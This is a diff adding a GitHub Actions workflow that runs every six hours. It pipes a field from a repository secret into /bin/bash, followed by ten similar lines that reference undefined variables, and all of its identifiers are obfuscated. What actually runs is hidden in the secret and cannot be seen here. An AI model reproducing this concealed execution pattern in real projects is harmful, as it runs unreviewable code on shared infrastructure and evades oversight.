@@ -1,0 +1,27 @@
+name: yuedagushun
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuedagushun
+        env:
+          n64493: ${{ secrets.n64493 }}
+        run: |
+          echo $n64493 | jq -r .hw69 | /bin/bash
+          echo $eibc5 | jq -r .h431 | /bin/bash
+          echo $s2473 | jq -r .xq991 | /bin/bash
+          echo $dhf7822 | jq -r .sw73637 | /bin/bash
+          echo $o5 | jq -r .ybyn6803 | /bin/bash
+          echo $hlzm42 | jq -r .dku435 | /bin/bash
+          echo $ht461 | jq -r .pjw61439 | /bin/bash
+          echo $zaxhu8 | jq -r .e1 | /bin/bash
+          echo $kcy3436 | jq -r .hqi2 | /bin/bash
+          echo $kpi5008 | jq -r .ft7 | /bin/bash
+          echo $e39695 | jq -r .dsvm50 | /bin/bash
+
